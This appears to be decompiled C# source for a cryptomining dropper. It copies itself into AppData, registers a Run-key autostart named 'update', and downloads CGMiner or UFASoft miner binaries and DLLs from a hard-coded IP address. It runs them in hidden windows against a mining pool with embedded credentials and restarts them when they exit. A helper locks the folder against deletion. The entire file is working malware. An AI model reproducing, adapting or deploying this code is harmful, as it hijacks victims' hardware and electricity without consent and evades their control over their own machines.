using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using My;

[StandardModule]
public sealed class Form3
{
	private static WebClient WebClient1 = new WebClient();

	private static Process MiningProcess = new Process();

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int GetModuleFileNameA(int hModule, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileName, int nSize);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int MoveFileExW([In][MarshalAs(UnmanagedType.LPTStr)] string lpExistingFileName, [In][MarshalAs(UnmanagedType.LPTStr)] string lpNewFileName, long dwFlags);

	[STAThread]
	public static void Main()
	{
		//IL_0765: Unknown result type (might be due to invalid IL or missing references)
		string name = "goblmah371z";
		try
		{
			Mutex.OpenExisting(name);
			Environment.Exit(0);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			new Mutex(initiallyOwned: true, name);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!Directory.Exists(Interaction.Environ("appdata") + "\\"))
			{
				LockAndHideFolder(Interaction.Environ("appdata") + "\\");
			}
			((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("update", Interaction.Environ("appdata") + "\\\\hideLoader.exe");
			if (!File.Exists(Interaction.Environ("appdata") + "\\\\hideLoader.exe"))
			{
				string? fileName = Process.GetCurrentProcess().MainModule!.FileName;
				string lpFileName = Process.GetCurrentProcess().MainModule!.FileName;
				MoveFileExW(Strings.LSet(fileName, GetModuleFileNameA(0, ref lpFileName, 256)), Interaction.Environ("appdata") + "\\\\hideLoader.exe", 8L);
			}
			string path = Interaction.Environ("windir") + "\\System32\\OpenCL.DLL";
			new DirectoryInfo(path);
			if (File.Exists(path))
			{
				if (!File.Exists(Interaction.Environ("appdata") + "\\\\CGMiner.exe"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov_9291/CGMiner.exe", Interaction.Environ("appdata") + "\\\\CGMiner.exe");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\\\diablo130302.cl"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov_9291/diablo130302.cl", Interaction.Environ("appdata") + "\\\\diablo130302.cl");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\\\diakgcn121016.cl"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov_9291/diakgcn121016.cl", Interaction.Environ("appdata") + "\\\\diakgcn121016.cl");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\\\libeay32.dll"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov_9291/libeay32.dll", Interaction.Environ("appdata") + "\\\\libeay32.dll");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\\\libidn-11.dll"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov_9291/libidn-11.dll", Interaction.Environ("appdata") + "\\\\libidn-11.dll");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\\\phatk121016.cl"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov_9291/phatk121016.cl", Interaction.Environ("appdata") + "\\\\phatk121016.cl");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\\\poclbm130302.cl"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov_9291/poclbm130302.cl", Interaction.Environ("appdata") + "\\\\poclbm130302.cl");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\\\scrypt130511.cl"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov_9291/scrypt130511.cl", Interaction.Environ("appdata") + "\\\\scrypt130511.cl");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\\\ssleay32.dll"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov_9291/ssleay32.dll", Interaction.Environ("appdata") + "\\\\ssleay32.dll");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\\\zlib1.dll"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov_9291/zlib1.dll", Interaction.Environ("appdata") + "\\\\zlib1.dll");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\\\libcurl-4.dll"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov_9291/libcurl-4.dll", Interaction.Environ("appdata") + "\\\\libcurl-4.dll");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\\\librtmp.dll"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov_9291/librtmp.dll", Interaction.Environ("appdata") + "\\\\librtmp.dll");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\\\libssh2.dll"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov_9291/libssh2.dll", Interaction.Environ("appdata") + "\\\\libssh2.dll");
				}
				Thread.Sleep(3009);
				ProcessStartInfo startInfo = MiningProcess.StartInfo;
				startInfo.FileName = Interaction.Environ("appdata") + "\\\\CGMiner.exe";
				startInfo.CreateNoWindow = true;
				startInfo.WindowStyle = ProcessWindowStyle.Hidden;
				startInfo.Arguments = "--scrypt -o us3.wemineltc.com:3333 -u Sandbox.3 -p hwa274f --auto-fan --auto-gpu --gpu-threads 4 --gpu-fan 100 --temp-target 60 --temp-overheat 70 --no-submit-stale -I d";
				startInfo = null;
			}
			else
			{
				if (!File.Exists(Interaction.Environ("appdata") + "\\\\UFASoft.exe"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov_9291/coin-miner.exe", Interaction.Environ("appdata") + "\\\\UFASoft.exe");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\\\bdb.dll"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov_9291/bdb.dll", Interaction.Environ("appdata") + "\\\\bdb.dll");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\\\btc.il"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov_9291/btc.il", Interaction.Environ("appdata") + "\\\\btc.il");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\\\btc-evergreen.il"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov_9291/btc-evergreen.il", Interaction.Environ("appdata") + "\\\\btc-evergreen.il");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\\\coinutil.dll"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov_9291/coinutil.dll", Interaction.Environ("appdata") + "\\\\coinutil.dll");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\\\miner.dll"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov_9291/miner.dll", Interaction.Environ("appdata") + "\\\\miner.dll");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\\\phatk.cl"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov_9291/phatk.cl", Interaction.Environ("appdata") + "\\\\phatk.cl");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\\\phatk.ptx"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov_9291/phatk.ptx", Interaction.Environ("appdata") + "\\\\phatk.ptx");
				}
				if (!File.Exists(Interaction.Environ("appdata") + "\\\\usft_ext.dll"))
				{
					WebClient1.DownloadFile("http://192.40.57.179/sov_9291/usft_ext.dll", Interaction.Environ("appdata") + "\\\\usft_ext.dll");
				}
				Thread.Sleep(3009);
				ProcessStartInfo startInfo2 = MiningProcess.StartInfo;
				startInfo2.FileName = Interaction.Environ("appdata") + "\\\\UFASoft.exe";
				startInfo2.CreateNoWindow = true;
				startInfo2.WindowStyle = ProcessWindowStyle.Hidden;
				startInfo2.Arguments = "-a scrypt -g no -o us3.wemineltc.com:3333 -u Sandbox.3 -p hwa274f -t 1";
				startInfo2 = null;
			}
			MiningProcess.Start();
			MiningProcess.EnableRaisingEvents = true;
			MiningProcess.Exited += MiningProcessClosed;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)ex2, (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
		while (true)
		{
			Thread.Sleep(3009);
		}
	}

	public static void MiningProcessClosed(object sender, EventArgs e)
	{
		MiningProcess.Start();
	}

	public static bool LockAndHideFolder(string path)
	{
		string name = WindowsIdentity.GetCurrent().Name;
		FileSystemAccessRule rule = new FileSystemAccessRule("Administrators", FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow);
		FileSystemAccessRule rule2 = new FileSystemAccessRule(name, FileSystemRights.DeleteSubdirectoriesAndFiles | FileSystemRights.Delete, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny);
		FileSystemAccessRule rule3 = new FileSystemAccessRule(name, FileSystemRights.Modify, InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow);
		DirectorySecurity directorySecurity = new DirectorySecurity();
		directorySecurity.AddAccessRule(rule);
		directorySecurity.AddAccessRule(rule3);
		directorySecurity.AddAccessRule(rule2);
		try
		{
			Process process = new Process();
			Directory.CreateDirectory(path, directorySecurity);
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.FileName = "CMD.exe";
			processStartInfo.Arguments = "/C attrib -s -h " + Convert.ToString(path);
			process.StartInfo = processStartInfo;
			process.Start();
			return true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
